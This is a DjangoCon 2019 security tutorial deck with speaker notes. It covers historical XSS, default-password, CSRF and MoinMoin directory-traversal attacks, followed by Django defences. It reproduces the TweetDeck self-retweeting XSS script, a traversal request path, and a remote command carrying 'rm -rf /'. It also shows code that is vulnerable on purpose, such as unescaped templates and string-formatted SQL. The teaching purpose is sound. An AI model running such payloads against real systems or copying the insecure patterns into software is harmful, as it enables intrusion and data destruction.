
## Web Application Security with Django

### DjangoCon 2019

### Jacinda Shelly

---

## The history of this tutorial


* PyCon 2015 - "Delving Into the Django Admin"

* A random email - "Getting Comfy with Web Security"

* A chance meetup

* A tutorial proposal for DjangoCon 2018, and PyCon 2019, and DjangoCon 2019

* Many, many updates (Django 1.4 -> Django 2.1/2!)

Note:

- I was giving a Django admin tutorial at PyCon 2015 and Asheesh emailed me asking if I would be interested in TA-ing
 for his tutorial (which was the next day).  I didn't have anything else going on and thought it would be cool, so 
 said sure!
- Met him at an event, talked about how I loved the tutorial but it was out-of-date
- He suggested I update it
- Upgrading from Django 1.4 to 2.2 took a lot; two of the vulnerabilities are a lot trickier to make happen!

---

## Instructor: Jacinda Shelly

* Co-Founder of Apero Health (Modern Medical Billing)
* Former CTO / First Engineer at Doctor On Demand
* Mother to a 3 y/o

<img src="https://pettwitter-docs.herokuapp.com/static/images/IMG_9232.jpg" width="300px">

Note:

- My background
- CTO / First engineer at Doctor On Demand
- Prior to that worked at a small defense contractor 
- Also have some academic credentials in this area, but they're old (MIT crypto and security class)

---

## What this Tutorial is Not


> Sometimes, when I check my work email, I’ll find a message that says
“Talk Announcement: Vertex-based Elliptic Cryptography on N-way
Bojangle Spaces.”


http://scholar.harvard.edu/files/mickens/files/thisworldofours.pdf

Note:

- Emphasize that this is not what this tutorial is about. It is about practical applications of security 
vulnerabilities and hands-on practice.
- It IS useful to understand the difference between signing and encrypting something, how handshakes work, etc. I 
think some people focus on these too much
- Talk about James Mickens
- "This World of Ours" - James Mickens

---

## Order of Operations

- Lecture: Example attacks
- Exercise: Google Dorking
- Group discussion: What are we trying to protect?
- Lab time (Part 1)
<hr>
- Break (30 minutes)
<hr>
- Lab time (Part 2)
- Lab Review (~30 minutes)

Note:

- The point of the first few exercises is getting you into a security mindset.
- We'll start that with a half hour lecture about different web security topics and some example attacks.
 We'll cover cross-site scripting, cross-site request forgery, etc. 
 We'll discuss specific examples of web apps that were attacked, starting with a Django tutorial example.
- After that, we'll break into small groups and ask each other what we're trying to protect.
- After that, we'll spend 90 minutes breaking into a web application that we put together for this session.
- Finally, we'll wrap-up with a walkthrough of what we learned and some key takeaways.

---

## Getting to know you

## Average Self-Ratings

### **Web Security:** 2.6
### **Python:** 3.2
### **Django:** 2.7

Note:

- Common things people were looking for:
    - Basic websecurity practices
    - Learn how to secure a Django webapp
    - How Django does security out of the box
- Go around the room, introduce yourselves
- Any questions before we dive in?


---

# A Sampling of Attacks

---

# TweetDeck (XSS)

<img src="https://media.wired.com/photos/593315b068cb3b3dc4097c8f/master/w_1164,c_limit/TweetDeck-1.3-Screenshot.jpg">

Note:

- Custom view of Twitter

---

## Raw Tweet: 2014

<img src="http://i.guim.co.uk/static/w-700/h--/q-95/sys-images/Guardian/Pix/pictures/2014/6/12/1402572144093/a46e0094-c865-47ea-b987-26bb9f3afaa9-620x372.png">

Note:

- This was the raw tweet

---

## How it Rendered

<img src="http://i.guim.co.uk/static/w-700/h--/q-95/sys-images/Guardian/Pix/pictures/2014/6/12/1402572144093/a46e0094-c865-47ea-b987-26bb9f3afaa9-620x372.png">

Ob das wohl funktioniert: <strong>Test</strong> <img src="https://abs.twimg.com/emoji/v1/72x72/2665.png" style="border: none; top: 30px; position: relative;">

Note:
- And this was how Tweetdeck rendered it

---

## Soon

<blockquote class="twitter-tweet" lang="en"><p>&lt;script class=&quot;xss&quot;&gt;
$(&#39;.xss&#39;).parents().eq(1).find(&#39;a&#39;).eq(1).click();
$(&#39;[data-action=retweet]&#39;).click();
<br>alert(&#39;XSS in Tweetdeck&#39;)&lt;/script&gt;<img src="https://abs.twimg.com/emoji/v1/72x72/2665.png" style="border: none; top: 30px; position: relative;"></p>&mdash; *arrrrndy (@derGeruhn) <a href="https://twitter.com/derGeruhn/status/476764918763749376">June 11, 2014</a></blockquote>
<script async src="//platform.twitter.com/widgets.js" charset="utf-8"></script>

Note:

- It wasn't long before someone tweeted this.

---

## Unplanned Downtime

<blockquote class="twitter-tweet" lang="en"><p>We&#39;ve temporarily taken TweetDeck services down to assess today&#39;s earlier security issue. We&#39;ll update when services are back up.</p>&mdash; TweetDeck (@TweetDeck) <a href="https://twitter.com/TweetDeck/status/476770732987252736">June 11, 2014</a></blockquote>

---

## So...what happened?

<blockquote class="twitter-tweet" lang="en"><p>&lt;script class=&quot;xss&quot;&gt;
$(&#39;.xss&#39;).parents().eq(1).find(&#39;a&#39;).eq(1).click();
$(&#39;[data-action=retweet]&#39;).click();
<br>alert(&#39;XSS in Tweetdeck&#39;)&lt;/script&gt;<img src="https://abs.twimg.com/emoji/v1/72x72/2665.png" style="border: none; top: 30px; position: relative;"></p>&mdash; *arrrrndy (@derGeruhn) <a href="https://twitter.com/derGeruhn/status/476764918763749376">June 11, 2014</a></blockquote>
<script async src="//platform.twitter.com/widgets.js" charset="utf-8"></script>

---

&lt;script>

&nbsp;

&nbsp;

alert('XSS in Tweetdeck');

&lt;/script><img src="https://abs.twimg.com/emoji/v1/72x72/2665.png" style="border: none; top: 30px; position: relative;">
---

&lt;script>

&nbsp;

$('[data-action=retweet]').click();

alert('XSS in Tweetdeck');

&lt;/script><img src="https://abs.twimg.com/emoji/v1/72x72/2665.png" style="border: none; top: 30px; position: relative;">

---

&lt;script class="xss">

&nbsp;

$('[data-action=retweet]').click();

alert('XSS in Tweetdeck');

&lt;/script><img src="https://abs.twimg.com/emoji/v1/72x72/2665.png" style="border: none; top: 30px; position: relative;">

---

&lt;script class="xss">

$('.xss').parents().eq(1).find('a').eq(1).click();

$('[data-action=retweet]').click();

alert('XSS in Tweetdeck');

&lt;/script><img src="https://abs.twimg.com/emoji/v1/72x72/2665.png" style="border: none; top: 30px; position: relative;">

Note:
- Uses jQuery to find the retweet button and click it and to favorite the tweet (go to the parents and find the first
 child)

---

<img src="http://zdnet1.cbsistatic.com/hub/i/r/2014/10/02/b1ac71c2-49e6-11e4-b6a0-d4ae52e95e57/resize/770x578/66b184f0ae55a656be043dd2e4e8361a/tweetdeck-hacked.png">


Note:
- Cross site scripting
- Ask attendees what _further_ damage the JS could have done.
- Delete all a user's tweets

---
# XSS

### Any Questions?

---

## A hacked talk

### Asheesh Laroia & Karen Rustad

Note:
- Asheesh was talking at PyCon 2014 about setting up a server 
- Used Nate Aune's version of the Django polls tutorial (on Github)

---

<img src="http://www.mit.edu/~asheesh/sec-talk/basic-polls-app.png">

Note:

The Django admin site was enabled, and whatever default users and passwords Nate had used, that's what I was using, too.

So then it was crystal clear. My "friend" must have decided to go to the admin site and change the poll to
 increase the lulz factor of the talk.

---

<img src="http://www.mit.edu/~asheesh/sec-talk/polls-app-page-3.png">

---

<img src="http://www.mit.edu/~asheesh/sec-talk/pwned.png">

---

<img src="http://www.mit.edu/~asheesh/sec-talk/pwned-2.png">

---

## So...what happened?

<img src="http://www.mit.edu/~asheesh/sec-talk/github-polls-app.png">


---
## Default password...

<img src="http://www.mit.edu/~asheesh/sec-talk/github-polls-app-password.png">

Note:

* Default passwords / urls
* Components with known vulnerabilities (older versions, plugins)
- As we go through the other examples in this section, you'll see different security issues that affected different 
sites. 
- As we go through the rest of these examples, remember that there is a test at the end -- you're going to 
actually have to use these attacks against some sample sites.

---
# Improper Authorization

### Any Questions?

---

# Why allowing GET to alter state can get you in trouble (CSRF)

---
## Google Web Accelerator

<img src="https://img.utdstc.com/screen/1/google-web-accelerator-001.jpg">

Note:

- IE / Firefox Extension
- Clicked on all the links in your search results ahead of time
- 2005 - 2008

---

## Basecamp Settings

<img src="https://signalvnoise.com/images/newbp-users.png">

Note:

- Popular web-based project management app called Basecamp (by 37Signals)
- Side note: they created RoR, so building on their work
- What do you think that trash can does when you click on it?

---

GET /user/1/delete

<img src="https://signalvnoise.com/images/newbp-users.png" width="300">

---

GET /user/1/delete

<img src="https://signalvnoise.com/images/newbp-users.png" width="300">

GET modifying server state is an easy opening for CSRF attacks

---
## CSRF

Can you submit information as an authenticated user from a different domain?

Note:
- One of the less well-understood exploits - key question on slide
- Any questions on CSRF?
- We'll go through a POST-based scenario and how Django protects against this in the practical and review later.

---
## Directory Traversal and Remote Code Execution

<img src="http://www.mit.edu/~asheesh/sec-talk/moinmoin.png">

Note:
 - Subset of improper authorization checking and dependency permissions.
 - MoinMoin is a wiki engine. The Python and Debian wikis both used to use this software.
 - It had an extensive set of plugins, including one called TWikiDraw, that allowed you to create and edits drawings
  for the wiki.

---

## TWikiDraw

<img src="http://twiki.org/p/pub/Plugins/TWikiDrawPlugin/screenshot.png">

---

## Editing an image

* GET /?action=twikidraw&do=modify&target=image.tar
* => Response: file_auth_ticket
    * e.g. fe3321bcda

Note:
- To actually edit an image, first you acquired an auth token (TWikiDraw would check your permissions)

---

## Editing an image

* GET /?action=twikidraw&do=modify&target=image.tar
* => Response: file_auth_ticket
    * e.g. fe3321bcda

then

* POST /?action=twikidraw&do=save&ticket=file_auth_ticket
* &target=image.tar

Note:
- Then you used that token (ticket) to confirm you had permission to edit that image and save it

---

## Editing an ... image?

* GET /?action=twikidraw&do=modify
* &target=../../../plugin/action/moinexec.py

then

* POST /?action=twikidraw&do=save&ticket=file_auth_ticket
* &target=../../../plugin/action/moinexec.py

Note:
- Couple of things wrong here
- Directory traversal and what else?
- Could have associated the original target with the auth ticket and not allowed user to edit anything else

---

## Now that we've planted our new "plugin"

GET /?action=moinexec&c=**whatever**

---

GET /?action=moinexec&c=rm%20-rf%20/

---

# Impact

* wiki.python.org & wiki.debian.org
* remote code execution

---

## Vulnerable Dependency / Improper Authorization Checks

### Questions?

---

## Summary

* Cross-site scripting (TweetDeck)

---

## Summary

* Cross-site scripting (TweetDeck)
* Security misconfiguration / authentication weaknesses (default password)

---

## Summary

* Cross-site scripting (TweetDeck)
* Security misconfiguration / authentication weaknesses (default password)
* Cross-site request forgery (GET to delete)

---

## Summary

* Cross-site scripting (TweetDeck)
* Security misconfiguration / authentication weaknesses (default password)
* Cross-site request forgery (GET to delete)
* Code injection / directory traversal (MoinMoin bug)

Note:

- We'll cover some other vulnerability classes like SQL injection and insecure deserialization in the practical

---

## What's next

* 15 minutes of "Google Dorking"
* Think (5m), Pair (5m), Share (5m)
* https://www.exploit-db.com/google-hacking-database

---

## What are Google Dorks?

> Google hacking, also named Google dorking, is a computer hacking technique that uses Google Search and other Google 
> applications to find security holes in the configuration and computer code that websites use.

- [Wikipedia](https://en.wikipedia.org/wiki/Google_hacking)

- [The original page](https://web.archive.org/web/20021208144443/http://johnny.ihackstuff.com/security/googleDorks.shtml)

---
## https://www.exploit-db.com/google-hacking-database

---
# Results

What did people find?

---

## Shodan: Google for other ports (FTP, printers, routers, etc.)

[Popular Shodan Searches](https://www.shodan.io/explore/popular)

Note:

- Shodan is for other ports what Google is for 80/443
- IoT

---

# What is at risk -- for you?

Small group discussion. Consider:

* Your servers
* Your users' information privacy
* Your users' account security
* Money
* What are the trade-offs?

---

# Other Questions?

Note:

- Before we go to the practical portion, are there any other questions?

---

# The Fun Part

## Go to http://pettwitter.com

Note:

- To a certain extent you can work at your own pace, but this tutorial is designed to encourage you to be social and 
learn from each other.
- I'll be stopping the group periodically to assess progress
- At this point, I should switch to showing that on-screen

---

# Wrap-up

* Discuss each vulnerability
* An ounce of prevention
* Resources
* Questions / Acknowledgements

Note:

- Talk about each vulnerability
- Talk about some best practices
- Resources for future learning

---

## Cross-site scripting (XSS - #1)

```
<p>{{ pet.description|safe }}</p>
```

---

## Cross-site scripting (XSS - #1)

```
<p>{{ pet.description|safe }}</p>
```

vs

```
<p>{{ pet.description }}</p>
```

---

## Cross-site scripting (XSS - #1)

* In Theory: Escape content in a context-appropriate way
* In Practice: This is really, really hard to get right. Like crypto, use good tools.
    * Django templates
    * Bleach (https://bleach.readthedocs.io/en/latest/)


    >>> import bleach
    
    >>> bleach.clean('an <script >evil()< /script> example')
    u'an &lt;script&gt;evil()&lt;/script&gt; example'
    
    >>> bleach.linkify('an http://example.com url')
    u'an <a href="http://example.com" rel="nofollow">http://example.com</a> url

---

## Defaults (not just passwords - #2)

What dangerous defaults do we have in our lives?

---

## Aside: Securing the Django Admin

* Change the default admin URL
* 2FA (Two-factor authentication) - django-two-factor-auth PyPi package
* Name the Admin Site
* General tools, but have some admin-specific tips
  * Run `python manage.py check --deploy`
  * Use [Sasha's Pony Checkup](https://www.ponycheckup.com)

<hr>

### References:
 - [5 Ways to Make Django Admin Safer](https://hakibenita.com/5-ways-to-make-django-admin-safer)
 - [10 Tips for Making the Django Admin More Secure](https://opensource.com/article/18/1/10-tips-making-django-admin-more-secure)

Note:
- Obscurity should never be your only line of defense, but you also don't need to make it easy for attackers.  That
 said, inventing your own crypto is bad and simpler, well-understood models are easier to secure

---

## Authorization checking (#3)

```
# If the user is not logged in, reject the request.
if not request.user.is_authenticated:
    raise PermissionDenied

# If they're trying to update a non-existent pet, reject the
# request with a 404.
pet = get_object_or_404(Pet, pk=pet_id)
```

---

## Authorization checking (#3)

```
# If they're trying to update a non-existent pet, reject the
# request with a 404.
pet = get_object_or_404(Pet, pk=pet_id)
```

---

## Authorization checking (#3)

```
# If they're trying to update a non-existent pet, or a pet they
# don't own, reject the request with a 404.
pet = get_object_or_404(Pet, pk=pet_id,
                        user=request.user)
```

- Aside: 403 vs 404?

Note:
- Principal of least information

---

## Authorization checking (#3)

* `@login_required ` not enough
* `Model.objects.filter(user=request.user)`

---

## Authorization checking (#3)

* `@login_required ` not enough
* `Model.objects.filter(user=request.user)`
* `Model.objects.for_user(request.user)`

---

## Authorization checking (#3)

* `@login_required ` not enough
* `Model.objects.filter(user=request.user)`
* `Model.objects.for_user(request.user)`
* `@user_passes_test(email_check)`

---

## Authorization checking (#3)

* `@login_required ` not enough
* `Model.objects.filter(user=request.user)`
* `Model.objects.for_user(request.user)`
* `@user_passes_test(email_check)`
* `@permission_required('polls.can_vote')`
---

## Authorization checking (#3)

https://docs.djangoproject.com/en/2.2/topics/auth/default/
https://docs.djangoproject.com/en/2.2/topics/auth/customizing/

---

## SQL injection (#4)

```
sql_query = '''SELECT * from communication_app_pet WHERE id=%s
AND user_id=%d''' % (
        pet_id,
        request.user.pk,
    )
```

---

## SQL injection (#4)

```
sql_query = '''SELECT * from communication_app_pet WHERE id=%s
AND user_id=%d''' % (
        pet_id,
        request.user.pk,
    )
```

vs

```
sql_query = '''SELECT * from communication_app_pet WHERE id=?
AND user_id=?'''

query.execute(sql_query, pet_id, request.user.pk)
```

---

## Just use the ORM

- pets = Pet.object.filter(pet=pet_id, user=request.user)

Many recent improvements in the Django ORM make it extremely rare to need raw SQL.

If you don't believe me, you need to sneak into this afternoon's tutorial with James Bennett.

Note:
- Personal experience working at Doctor On Demand - millions of patient visits, can count on one hand the 
 places where we used raw SQL.

---

## SQL injection (#4)

* Don't use raw SQL.
* Use an ORM (Django ORM or SQLAlchemy).
* If you must, use parameterized queries.
* Read _all_ the ORM documentation before you think you must.

---

## Cross-site request forgery (#5)

* POST to change data, and something that only a user _on that site_ can have
* Django: `{%  csrf_token %}`

Note:

- The way cookies work, you need to be on the correct domain to access

---

## Secure by default

* Had to actively disable certain settings to get this attack to work
* `SESSION_COOKIE_SAMESITE = None` vs `SESSION_COOKIE_SAMESITE = 'Lax'` (Default)

https://docs.djangoproject.com/en/2.2/ref/settings/#session-cookie-samesite

---

## Session data stealing (#6)

```
# SECURITY WARNING: keep the secret key used in production secret!
SECRET_KEY = '...'
```

Note:

- Sensitive settings should never be in the codebase!
- Even if your repo never gets compromised externally, what about ex-employees?

---

### Session data stealing (#6)


```
SECRET_KEY = os.environ['DJANGO_SECRET_KEY']
```

* Use a vault (Hashicorp, etc.)
* Read up on best practices
* Something is better than nothing

---

## Session data stealing (#6)

* Keep secrets secret.

---

## Signed Cookies

- https://docs.djangoproject.com/en/2.2/topics/http/sessions/#using-cookie-based-sessions

---

## Code injection (#7)

Don't use Pickle unless there is a *very* good reason JSON et. al. won't work.

If you must use Pickle, keep it firewalled.

Are you *sure* you need Pickle?

---

## Vulnerable dependencies

* Libraries run with full privilege
* Only use trusted sources
* Get fresh versions, and read the diff
* Turn on Github security warnings for your private repositories
* pyup / requires.io

Note:
- Github will automatically generate pull requests for libraries that have security vulnerabilities

---

## Testing

There's clearly no testing in this app. This isn't a talk on testing, but *DO* test for security.

Note:

- There's clearly no testing in this app. It can be a powerful resource for security.
- Both TDD and building things after discovery
- Also can use other analysis tools as part of CI

---

## Testing

```
# Positive assertions
assert(response.status_code, 200)

# Negative assertions
assert(response.status_code, 403)
```


---

## Resources (Django Documentation and Related)

- https://docs.djangoproject.com/en/2.2/howto/deployment/checklist/
  - Run `python thesite/manage.py check --deploy`
- https://docs.djangoproject.com/en/2.2/topics/security/
- https://www.ponycheckup.com

---
## Resources (General)

* Open Web App Security Project (e.g. OWASP Top 10)
* `security` email lists everywhere
* Security Now and other security related podcasts
* Anything (talk, paper, etc. by James Mickens): https://mickens.seas.harvard.edu/wisdom-james-mickens
* [Black Hat Python Book](https://www.amazon.com/Black-Hat-Python-Programming-Pentesters/dp/1593275900/)
* The Tangled Web by Michael Zalewski

Note:
- What are other people's favorite resources?

---

## Things you can run against yourself

- Github security vulnerabilities
- Pony Checkup
- Metasploit
- Google Dorking
- Nmap
- Jack the Ripper
- Burpsuite

---

# The Code!

## https://github.com/django-security-tutorials/

---

## Thanks

All the following people helped with this tutorial:

* Asheesh Laroia (Original Creator)
* Jacky Chang
* Drew Fisher
* William Hakizimana
* Andrew Pinkham
* Karen Rustad
* Jacinda Shelly
* Nicole Zuckerman
